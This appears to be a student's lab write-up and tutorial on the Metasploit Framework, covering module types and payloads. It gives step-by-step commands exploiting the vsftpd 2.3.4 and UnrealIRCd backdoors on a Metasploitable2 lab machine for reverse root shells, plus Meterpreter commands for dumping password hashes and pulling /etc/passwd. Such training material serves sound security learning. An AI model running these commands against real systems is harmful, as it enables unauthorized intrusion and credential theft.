# 02 — Metasploit Framework: Complete Guide

## What Is Metasploit

**Metasploit Framework** is the world's most widely used penetration
testing platform. It provides a structured way to find, exploit, and
validate vulnerabilities. Created in 2003 by H.D. Moore, now maintained
by Rapid7 and the open-source community.

In our lab we used: **Metasploit v6.4.126-dev** (preinstalled on Kali).

---

## Architecture — How It Works

```
┌─────────────────────────────────────────────────┐
│                 METASPLOIT                       │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌───────────────┐  │
│  │ Exploit  │  │ Payload  │  │   Auxiliary   │  │
│  │ Module   │  │          │  │   Module      │  │
│  └──────────┘  └──────────┘  └───────────────┘  │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌───────────────┐  │
│  │  Post    │  │ Encoder  │  │    NOPS       │  │
│  │ Module   │  │          │  │               │  │
│  └──────────┘  └──────────┘  └───────────────┘  │
└─────────────────────────────────────────────────┘
```

### Module Types

| Type | Purpose | Example |
|---|---|---|
| **Exploit** | Delivers payload by exploiting a vulnerability | `vsftpd_234_backdoor` |
| **Payload** | Code that runs on the target after exploitation | `cmd/unix/reverse_netcat` |
| **Auxiliary** | Scanning, fuzzing, sniffing — no payload | `scanner/portscan/tcp` |
| **Post** | Actions after exploitation (privilege escalation, data exfiltration) | `post/linux/gather/enum_system` |
| **Encoder** | Obfuscates payload to evade antivirus | `x86/shikata_ga_nai` |
| **NOP** | Padding for buffer overflow exploits | `x86/single_byte` |

---

## Core Concepts

### Exploit
An exploit takes advantage of a specific vulnerability in software.
It delivers the payload to the target system.

```
Vulnerability + Exploit Code → Code Execution on Target
```

Each exploit targets a specific CVE or vulnerability class.
Example: `exploit/unix/ftp/vsftpd_234_backdoor` targets the
backdoor inserted in vsftpd 2.3.4 source code (2011).

### Payload
The payload is what actually runs on the target after exploitation.
Think of it as the "cargo" the exploit delivers.

```
Exploit = Delivery vehicle (the truck)
Payload = What gets delivered (the package)
```

### Rank
Every module has a reliability rank:

| Rank | Meaning |
|---|---|
| **Excellent** | Never crashes the service, works reliably |
| **Great** | Auto-detects target, high reliability |
| **Good** | Standard reliability |
| **Normal** | May require specific conditions |
| **Average** | Works sometimes |
| **Low** | More theoretical than practical |
| **Manual** | Requires manual steps |

Both exploits we used (`vsftpd_234_backdoor`, `unreal_ircd_3281_backdoor`)
had rank **Excellent** — zero risk of crashing the target service.

---

## Payload Types

### Staged vs Stageless

**Stageless** (`/`) — single self-contained payload:
```
cmd/unix/reverse_netcat
         ↑ type/os/payload_name
```
Sends everything at once. Larger but self-sufficient.

**Staged** (`_`) — two-part payload:
```
windows/meterpreter/reverse_tcp
                   ↑ separator
Stage 1: small stager (connects back to Metasploit)
Stage 2: full Meterpreter (downloaded after stage 1 connects)
```
Smaller initial footprint. Requires active connection to Metasploit.

### Connection Direction

**Bind Shell** — target listens, attacker connects:
```
Attacker ──────────────▶ Target (listening on port X)
```
Problem: firewall often blocks incoming connections on the target.

**Reverse Shell** — attacker listens, target connects back:
```
Target ────────────────▶ Attacker:4444 (Metasploit listening)
```
Bypasses firewalls because outbound connections are usually allowed.
This is why LHOST is required: the target needs to know where to call.

### Payload Examples We Used

| Payload | Type | Connection | Use case |
|---|---|---|---|
| `cmd/unix/reverse_netcat` | Stageless | Reverse | vsftpd on old Linux |
| `cmd/unix/reverse` | Stageless | Reverse | UnrealIRCd double handler |
| `cmd/linux/http/x86/meterpreter_reverse_tcp` | Staged | Reverse | Auto-configured |

---

## Essential Commands

### Starting and Navigation
```bash
msfconsole              # Start Metasploit
msfconsole -q           # Start quietly (no banner)
msfconsole -q -x "cmd" # Start and run command immediately
exit                    # Exit Metasploit
```

### Finding Modules
```
search vsftpd                      # Search by keyword
search cve:2010-2075               # Search by CVE
search type:exploit platform:unix  # Filter by type and platform
search rank:excellent              # Filter by rank
```

### Using Modules
```
use exploit/unix/ftp/vsftpd_234_backdoor  # Select module
info                                        # Show full module info
info -d                                     # Show extended info + links
show options                                # Show required parameters
show payloads                               # List compatible payloads
```

### Configuring Options
```
set RHOSTS 10.10.10.101            # Target IP(s)
set RPORT 21                       # Target port
set LHOST 10.10.10.100             # Our IP (for reverse shells)
set LPORT 4444                     # Our listening port
set PAYLOAD cmd/unix/reverse_netcat # Set payload
setg LHOST 10.10.10.100            # Set globally (all modules)
```

### Running Exploits
```
check    # Check if target is vulnerable (if supported)
run      # Run the exploit (same as 'exploit')
exploit  # Alternative to 'run'
```

### Session Management
```
sessions         # List all active sessions
sessions -i 1    # Interact with session 1
sessions -k 1    # Kill session 1
background       # Send current session to background (Ctrl+Z)
```

---

## What We Did in the Lab — Explained

### vsftpd Exploit Step by Step

```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
```
Loads the module that knows about the vsftpd ":)" backdoor.

```
msf > set RHOSTS 10.10.10.101
```
Tells Metasploit: "the target is at this IP".

```
msf > set LHOST 10.10.10.100
```
Tells Metasploit: "I'm at this IP — have the target connect back here".
Required because we're using a **reverse** payload.

```
msf > set PAYLOAD cmd/unix/reverse_netcat
```
Chooses the payload. `cmd/unix` means a raw command shell (not Meterpreter)
on a Unix system. `reverse_netcat` uses netcat to create the connection.
We chose this because Metasploitable2 is very old (2008, i686) and
modern payloads like Meterpreter may fail on ancient systems.

```
msf > run
```
Metasploit:
1. Connects to port 21 (FTP)
2. Sends username "randomstring:)" — the ":)" triggers the backdoor
3. The backdoor code executes: `exec("/bin/sh", ...)`
4. Opens reverse connection from Meta:randomport → Kali:4444
5. We get a shell running as whatever user vsftpd runs as (root on Meta)

### UnrealIRCd Exploit Step by Step

The UnrealIRCd backdoor works similarly but uses a different trigger:
any string starting with "AB" on the IRC connection executes a shell
command. Metasploit sends "AB" + encoded shell command, gets reverse
connection on our listener.

The `cmd/unix/reverse` payload uses a **double handler** — two separate
TCP connections, one for stdin and one for stdout/stderr. This is more
stable but requires two ports internally.

---

## Meterpreter vs Raw Shell

### Raw/Command Shell (what we used)
```
$ whoami
root
$ id
uid=0(root) gid=0(root)
```
Basic terminal. No special features. Limited.
Required for very old targets (Metasploitable2).

### Meterpreter (advanced)
Full-featured agent with many capabilities:
```
meterpreter > sysinfo          # System information
meterpreter > getuid           # Current user
meterpreter > hashdump         # Dump password hashes
meterpreter > upload /file /   # Upload file to target
meterpreter > download /etc/passwd # Download file from target
meterpreter > shell            # Drop to system shell
meterpreter > getsystem        # Attempt privilege escalation
meterpreter > run post/linux/gather/enum_system  # Run post module
```
Meterpreter runs entirely in memory — no files written to disk.
This makes it harder to detect and leaves fewer traces.

---

## The Database — Workspace Management

Metasploit can store scan results in a PostgreSQL database:

```bash
# Start database (Kali)
sudo service postgresql start
sudo msfdb init

# In msfconsole
db_status          # Check database connection
workspace          # List workspaces
workspace -a lab   # Create/switch to "lab" workspace
db_nmap -sV 10.10.10.101  # Run nmap and save results to DB
hosts              # View discovered hosts
services           # View discovered services
vulns              # View identified vulnerabilities
```

This is useful for longer engagements where you need to track findings.
For our lab, we didn't use the database — single-target simple exploits
don't require it.

---

## Module Information — Always Read It

Before running any exploit, always run `info` or `info -d`:

```
Name: vsFTPd 2.3.4 Backdoor Command Execution
Module: exploit/unix/ftp/vsftpd_234_backdoor
Rank: Excellent
Disclosed: 2011-07-03

Description:
  This module exploits a malicious backdoor that was added to the
  VSFTPD download archive. This backdoor was introduced into the
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011.

References:
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
  OSVDB (73573)
```

Key things to check:
- **Rank** — reliability of the exploit
- **Disclosed date** — how old is the vulnerability
- **References** — CVE, OSVDB, writeups
- **Check supported** — can we verify without exploiting?

---

## Lab Reference: Our Exploits

| Module | Target | Port | CVE | Result |
|---|---|---|---|---|
| `exploit/unix/ftp/vsftpd_234_backdoor` | Meta | 21 | — | Root shell ✅ |
| `exploit/unix/irc/unreal_ircd_3281_backdoor` | Meta | 6667 | CVE-2010-2075 | Root shell ✅ |

Both were rank **Excellent**, both returned `uid=0(root)`.

---

## Key Takeaways

- Metasploit is a framework — modules, not magic. Each module has
  a specific vulnerability it exploits
- Exploits ≠ payloads: the exploit delivers the payload, the payload
  is what runs on the target
- LHOST is required for reverse shells: the target needs to know
  where to call back
- Rank matters: Excellent means it won't crash services, crucial in
  real engagements
- Always read `info` before running — understand what you're doing
- Raw shell vs Meterpreter: raw for old/limited systems, Meterpreter
  for modern targets with full post-exploitation needs
- The database stores findings: useful for complex engagements with
  many targets
